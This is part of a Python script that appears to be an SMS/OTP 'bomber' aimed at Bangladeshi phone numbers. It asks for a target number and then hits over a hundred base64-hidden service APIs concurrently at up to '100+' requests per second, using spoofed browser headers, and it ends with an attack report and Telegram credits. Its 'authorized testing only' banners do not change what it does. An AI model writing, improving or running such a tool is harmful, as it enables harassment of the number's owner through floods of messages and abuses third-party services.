    print(" ╚══════════════════════════════════════════════════════════════════════════╝")
    print(f"{R}{BO}")
    print(" ╔══════════════════════════════════════════════════════════════════════════╗")
    print(f" ║  {W}⚠  FOR AUTHORIZED TESTING ONLY - USE RESPONSIBLY  ⚠{R}                ║")
    print(" ╚══════════════════════════════════════════════════════════════════════════╝")
    print(f"{E}")
    print(f" {C}Ctrl+C = STOP  |  Ctrl+Z = PAUSE/RESUME{E}")
    print(f" {Y}Target: Any BD Number | 100+ APIs Active{E}\n")


async def hit(session, api, pd):
    try:
        name, url_b64, payload = api[0], api[1], api[2]
        url = bd(url_b64)
        data = {}
        for k, v in payload.items():
            sv = str(v)
            sv = sv.replace('z', pd['z']).replace('c', pd['c'])
            sv = sv.replace('e8', pd['e8']).replace('e88', pd['e88'])
            sv = sv.replace('e80', pd['e80']).replace('e880', pd['e880'])
            sv = sv.replace('p8', pd['p8']).replace('p80', pd['p80'])
            sv = sv.replace('p880', pd['p880']).replace('10', pd['10'])
            try:
                data[k] = json.loads(sv) if sv.startswith('{') else sv
            except:
                data[k] = sv
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 Chrome/128.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "x-requested-with": "mark.via.gp",
            "Origin": "https://www.google.com",
            "Referer": "https://www.google.com/"
        }
        if not data:
            async with session.get(url, headers=headers, ssl=_ssl, timeout=10) as r:
                ok = r.status in [200, 201, 202, 204, 302]
        else:
            async with session.post(url, headers=headers, json=data, ssl=_ssl, timeout=10) as r:
                ok = r.status in [200, 201, 202, 204, 302]
        st['total'] += 1
        if ok:
            st['ok'] += 1
        else:
            st['fail'] += 1
    except Exception:
        st['total'] += 1
        st['fail'] += 1


async def attack_cycle(session, pd):
    tasks = []
    for api in APIS:
        tasks.append(hit(session, api, pd))
    await asyncio.gather(*tasks, return_exceptions=True)


def monitor_thread(mode):
    """Live status monitor with full animation"""
    target_spd = 60 if mode == 'fast' else 30
    while not st['stop']:
        e = time.time() - st['start']
        rate = st['total'] / max(e, 1)
        sp_index = st['total'] % 10
        sp = spinner[sp_index]
        bar_w = 30
        fill = int(st['ok'] / max(st['total'], 1) * bar_w) if st['total'] > 0 else 0
        fill = min(fill, bar_w)
        if fill >= bar_w:
            bar = f"{G}{'█'*bar_w}{E}"
        elif fill > 0:
            bar = f"{G}{'█'*fill}{R}{'█'*(bar_w-fill)}{E}"
        else:
            bar = f"{R}{'█'*bar_w}{E}"
        f = fire[st['total'] % 6]
        h = hearts[st['total'] % 6]
        sys.stdout.write(
            f"\r{C}[{sp}] {W}SENT:{G}{st['total']:>6}{C} ✓:{G}{st['ok']:>6}{C} ✗:{R}{st['fail']:>6}"
            f"{C} SPD:{Y}{rate:>5.1f}/s{C} TGT:{Y}{target_spd}/s{C} TM:{Y}{e:>5.0f}s"
            f"{C} {f} {bar} {h}{E}"
        )
        sys.stdout.flush()
        time.sleep(0.1)


async def main():
    show_banner()

    # Mode selection with animation
    print(f"{Y}{BO}")
    print(" ╔══════════════════════════════════════╗")
    print(f" ║       ⚡  ATTACK MODE SELECTION  ⚡     ║")
    print(" ╚══════════════════════════════════════╝{E}")
    print(f" {R}{BO}[1] FAST MODE  - 60 Requests/Second{E}")
    print(f" {G}{BO}[2] SLOW MODE  - 30 Requests/Second{E}")
    print(f" {C}{BO}[3] INSANE MODE - 100+ Requests/Second (Experimental){E}")
    while True:
        m = input(f"\n{P}{BO}SELECT [1/2/3]: {W}").strip()
        if m in ['1', '2', '3']:
            break
        print(f"{R}Invalid selection!{E}")

    mode_speed = {'1': 'fast', '2': 'slow', '3': 'insane'}
    mode_display = {'1': 'FAST (60/s)', '2': 'SLOW (30/s)', '3': 'INSANE (100+/s)'}
    mode = mode_speed[m]
    print(f"\n{G}{BO}✔ {mode_display[m]} ACTIVATED{E}")

    # Phone input
    while True:
        num = input(f"\n{G}{BO}📞 ENTER TARGET PHONE NUMBER: {W}").strip()
        digits = ''.join(filter(str.isdigit, num))
        if len(digits) >= 10:
            break
        print(f"{R}Invalid! Minimum 10 digits required.{E}")

    pd = fmtnum(num)
    st['start'] = time.time()

    print(f"\n{C}{BO}")
    print(" ╔═══════════════════════════════════════════════════════════╗")
    print(f" ║  {W}TARGET:{Y} {pd['z']}{' '*(20-len(pd['z']))}{C}║  {W}MODE:{Y} {mode.upper()}{' '*(10-len(mode))}║")
    print(f" ║  {W}SPEED:{Y} {mode_display[m]}{' '*(15-len(mode_display[m]))}{C}║  {W}APIS:{P} 100+{C}            ║")
    print(" ╚═══════════════════════════════════════════════════════════╝{E}")
    print(f" {R}{BO}Ctrl+C = STOP  |  Ctrl+Z = PAUSE/RESUME{E}")
    print(f" {Y}Attack Started...{E}\n")

    # Start monitor thread
    monitor = threading.Thread(target=monitor_thread, args=(mode,), daemon=True)
    monitor.start()

    # Main attack loop
    timeout = aiohttp.ClientTimeout(total=10, connect=5)
    connector = aiohttp.TCPConnector(
        limit=2000, limit_per_host=500, ssl=_ssl, enable_cleanup_closed=True
    )
    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        while not st['stop']:
            while st['pause'] and not st['stop']:
                await asyncio.sleep(0.5)
            if st['stop']:
                break
            await attack_cycle(session, pd)
            if m == '2':
                await asyncio.sleep(0.1)
            elif m == '3':
                pass  # No delay = insane mode

    # Final report
    e = time.time() - st['start']
    print(f"\n\n{R}{BO}")
    print(" ███████╗██╗███╗   ██╗ █████╗ ██╗         ██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗")
    print(" ██╔════╝██║████╗  ██║██╔══██╗██║         ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝")
    print(" █████╗  ██║██╔██╗ ██║███████║██║         ██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   ")
    print(" ██╔══╝  ██║██║╚██╗██║██╔══██║██║         ██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   ")
    print(" ██║     ██║██║ ╚████║██║  ██║███████╗    ██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   ")
    print(" ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ")
    print(f"{E}")
    print(f"{Y}{BO}╔══════════════════════════════════════════════════════╗")
    print(f"║            📊  FINAL ATTACK REPORT             ║")
    print(f"╚══════════════════════════════════════════════════════╝{E}")
    print(f"{C}╔{'═'*50}╗{E}")
    print(f"{C}║ {W}📦 Total Requests     {C}: {Y}{st['total']:<10} {C}   ║")
    print(f"{C}║ {G}✅ Successful         {C}: {G}{st['ok']:<10} {C}   ║")
    print(f"{C}║ {R}❌ Failed             {C}: {R}{st['fail']:<10} {C}   ║")
    print(f"{C}║ {P}📈 Success Rate       {C}: {P}{st['ok']*100//max(st['total'],1)}%{' '*(10-len(str(st['ok']*100//max(st['total'],1))))} {C}   ║")
    print(f"{C}║ {Y}⏱️  Runtime            {C}: {Y}{e/60:.1f}m {e%60:.0f}s{' '*(5-len(str(f'{e/60:.1f}m {e%60:.0f}s')))} {C}   ║")
    print(f"{C}║ {Y}🚀 Avg Speed           {C}: {Y}{st['total']/max(e,1):>6.1f}/sec{' '*(3-len(str(f'{st['total']/max(e,1):.1f}')))} {C}   ║")
    print(f"{C}╚{'═'*50}╝{E}")
    print(f"\n{P}{BO}{'🔥'*5}  CREDIT: @RASHD {'🔥'*5}{E}")
    print(f"{Y}{'⭐'*3}  t.me/Darkbdx1@V4Z_pro_dev1  {'⭐'*3}{E}")
    print(f"{R}{'💀'*5}  STAY LEGAL - AUTHORIZED TESTING ONLY  {'💀'*5}{E}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\n{R}⚠ SYSTEM ERROR: {e}{E}")
        print(f"{Y}Restarting in 5 seconds...{E}")
        time.sleep(5)
        try:
            asyncio.run(main())
        except:
            pass